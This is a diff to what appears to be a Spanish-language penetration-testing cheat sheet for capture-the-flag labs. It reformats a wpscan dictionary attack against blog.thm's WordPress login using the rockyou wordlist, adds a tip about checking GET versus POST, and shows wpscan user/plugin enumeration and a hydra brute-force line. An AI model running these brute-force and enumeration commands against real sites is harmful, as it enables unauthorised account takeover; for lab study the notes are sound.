@@ -227,11 +227,9 @@ wpscan --url http://TARGET -e vp,vt,u  ---> plugins vuln, usuarios, versiones.
 
 Ataque de diccionario WordPress:
 
-wpscan --url http://blog.thm/wp-login.php \
---usernames users.txt \
---passwords /usr/share/wordlists/rockyou.txt
+wpscan --url http://blog.thm/wp-login.php --usernames users.txt --passwords /usr/share/wordlists/rockyou.txt
 
-Bruteforce login web:
+Bruteforce login web: MIRAR SI VA POR GET O POR POST. (Inspeccionar: Network. O en Burpsuite)
 
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt http-post-form
 
